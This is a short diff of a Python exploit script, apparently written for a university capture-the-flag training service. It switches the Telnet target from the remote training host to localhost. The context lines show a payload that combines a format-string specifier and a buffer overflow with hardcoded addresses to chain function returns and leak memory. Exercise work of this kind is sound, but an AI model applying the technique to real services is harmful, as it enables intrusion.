@@ -5,8 +5,8 @@ main_addr = "\x88\x85\x04\x08"
 name_addr = "\x48\xa0\x04\x08"
 read_addr = "\x0c\xa0\x04\x08"
 
-pwn = Telnet("train.cs.nctu.edu.tw",11003)
-#pwn = Telnet("127.0.0.1",5566)
+#pwn = Telnet("train.cs.nctu.edu.tw",11003)
+pwn = Telnet("127.0.0.1",5566)
 raw_input("test")
 print pwn.read_until("name:")
 pwn.write("AAAA"+"%1$s"+"\x00"*12+"\x50001"+"a"*41+print_addr+main_addr+name_addr+read_addr)
